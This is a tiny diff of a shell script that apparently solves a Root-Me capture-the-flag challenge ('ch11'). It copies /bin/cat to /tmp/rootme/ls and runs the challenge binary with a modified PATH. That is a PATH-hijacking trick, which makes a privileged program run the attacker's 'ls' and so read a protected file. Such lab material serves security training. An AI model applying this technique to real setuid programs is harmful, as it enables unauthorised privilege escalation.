@@ -1,4 +1,3 @@
 mkdir /tmp/rootme
-env PATH='/tmp/rootme:$PATH'
 cp /bin/cat /tmp/rootme/ls
-./ch11
+env PATH='/tmp/rootme:$PATH' ./ch11
